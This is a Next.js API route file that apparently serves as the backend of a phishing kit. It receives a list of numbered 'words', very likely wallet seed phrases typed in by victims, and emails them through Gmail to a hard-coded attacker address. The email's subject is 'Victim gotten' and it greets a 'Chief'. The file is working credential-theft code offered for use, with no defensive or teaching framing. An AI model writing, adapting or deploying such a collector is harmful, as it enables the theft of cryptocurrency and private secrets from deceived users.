import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export async function POST(request: Request) {
  // Request is sufficient here
  const { ...words } = await request.json();

  const wordsList = Object.keys(words)
    .map((key, index) => {
      return `<li style="margin-bottom: 8px;"><strong style="color: #333;">Word ${
        index + 1
      }:</strong> ${words[key]}</li>`;
    })
    .join("");

  // Nodemailer setup
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });

  const mailOptions = {
    from: "noreply@yahoo.com",
    to: "Twenty8eight7@gmail.com",
    subject: "Good Day Victim gotten",
    html: `
        <html>
          <body style="background-color: #f4f4f4; padding: 1.5rem;">
            <div style="max-width: 600px; margin: auto; background-color: #fff; padding: 1.5rem; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
              <h1 style="font-size: 1.5rem; font-weight: 700; color: #333; text-align: center;">Result gotten</h1>
              <p style="color: #555; margin-top: 1rem;">Hello Chief,</p>
              <p style="color: #555; margin-top: 0.5rem;">Here are your result gotten</p>
              <ul style="padding-left: 20px; margin-top: 1rem;">
              ${wordsList}
                </ul>
              <p style="color: #555; margin-top: 1rem;">This is an Ocee effect</p>
           
            </div>
          </body>
        </html>
      `,
  };

  try {
    await transporter.sendMail(mailOptions);
    return NextResponse.json({ message: "Email sent successfully!" });
  } catch (error) {
    return NextResponse.json(
      { message: "Failed to send email.", error },
      { status: 500 }
    );
  }
}
